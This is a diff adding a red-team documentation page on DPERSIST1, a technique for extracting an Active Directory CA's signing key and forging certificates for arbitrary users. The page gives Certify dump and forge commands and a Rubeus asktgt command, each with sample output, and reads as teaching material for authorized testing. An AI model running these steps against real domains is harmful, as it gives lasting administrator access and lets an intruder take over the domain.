@@ -1,0 +1,163 @@
+---
+title: 'DPERSIST1 - Forging Certificates with Stolen CA'
+description: 'Extend one-time privileged access to a CA server into unrestricted privileged access across the entire environment by forging certificates with stolen CA certificates.'
+icon: 'key'
+sidebarTitle: 'DPERSIST1 - Forging Certificates with Stolen CA'
+---
+
+DPERSIST1 is a technique used to extend one-time privileged access to a CA server into unrestricted privileged access across the entire environment. Specifically, once privileged access has been obtained on a CA server, it is possible to extract the CA signing certificate and associated private key, and use these to sign self-made certificates for arbitrary identities and purposes in the environment, thereby making these self-made certificates trusted for authentication in the Active Directory domain.
+
+<Warning>
+This technique provides unrestricted persistence in the domain and should only be used in authorized testing scenarios with proper approval.
+</Warning>
+
+Effectively, this technique can be used for unrestricted persistence in the domain, as it allows the adversary to forge certificates for arbitrary users and purposes. However, if the CA server is not being treated as a [Tier 0](https://posts.specterops.io/what-is-tier-zero-part-1-e0da9b7cdfca) asset, and server admins equivalent to [Tier 1](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model) has administrative privileges on the server, this technique can be used for privilege escalation.
+
+## Obtaining the CA Signing Certificate
+
+In order to execute DPERSIST1, we must first obtain the CA signing certificate. This can be done in a plethora of ways:
+
+<Accordion title="CA Backup Feature">
+- Open `certsrv.msc`
+- Right click the CA -> `All Tasks` -> `Back up CA...`
+- Follow the wizard but make sure to check `Private key and CA certificate`
+- The certificate should now exist at the chosen location (`CA-NAME.p12`)
+</Accordion>
+
+<Accordion title="CA Server's Machine Certificate Store">
+- Open `certlm.msc`
+- Go to `Personal` -> `Certificates`
+- Right click the CA signing certificate -> `All Tasks` -> `Export...`
+- Follow the wizard but make sure to choose `Yes, export the private key`
+- The certificate should not exist at the chosen location (`CA-NAME.pfx`)
+</Accordion>
+
+<Accordion title="Windows Certificate Services certutil.exe">
+```bash
+certutil.exe -backupkey <directory>
+```
+
+<Info>
+This feature has been implemented in Certify with the `manage-self --dump-certs` command.
+</Info>
+</Accordion>
+
+## Dumping Certificates with Certify
+
+<CodeGroup>
+```bash Command
+Certify.exe manage-self --dump-certs
+```
+
+```text Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage the current machine
+
+[*] Attempting to dump a certificate from the certificate store.
+[*] Certificate (PFX) - CORP-CA01-CA:
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:00.3382608
+```
+</CodeGroup>
+
+## Forging Certificates
+
+Once the CA signing certificate has been obtained, we can start forging our own certificates for arbitrary users. This can be done using the `forge --ca-cert <pfx-path/base64-pfx>` command from Certify.
+
+<CodeGroup>
+```bash Command
+Certify.exe forge --ca-cert MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500
+```
+
+```text Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Forge a (golden) certificate
+
+CA Certificate Information:
+  Subject:        CN=CORP-CA01-CA, DC=corp, DC=local
+  Issuer:         CN=CORP-CA01-CA, DC=corp, DC=local
+  Start Date:     21/05/2025 12.13.47
+  End Date:       21/05/2030 12.23.46
+  Thumbprint:     CFBDC6826AC074EF86BE7774F959A2FF5F322DDC
+  Serial:         12D3E574A63DE7854A9E5A1F4CD56490
+
+Forged Certificate Information:
+  Subject:        CN=User
+  SubjectAltName: Administrator
+  Issuer:         CN=CORP-CA01-CA, DC=corp, DC=local
+  Start Date:     30/06/2025 15.56.28
+  End Date:       30/06/2026 15.56.28
+  Thumbprint:     93215C22F943FC99E296B945295EB86E0CC37750
+  Serial:         0096F3BC7B4B56AA1A501F1A97FEECA37A
+
+Forged certificate (PFX):
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:00.7056050
+```
+</CodeGroup>
+
+## Using the Forged Certificate
+
+When the certificate has been forged, it can be used to persistently authenticate as the target account using the [`asktgt`](/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt) command from [Rubeus](/ghostpack-docs/Rubeus-mdx/overview).
+
+<CodeGroup>
+```bash Command
+Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+```
+
+```text Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=User
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\Administrator'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  30/06/2025 16.00.24
+  EndTime                  :  01/07/2025 02.00.24
+  RenewTill                :  07/07/2025 16.00.24
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  o6o+mRr6Rv1e+yBLYYSxOg==
+  ASREP (key)              :  13D4AC9D6B6DEEFE900A7707C6C44C98
+```
+</CodeGroup>
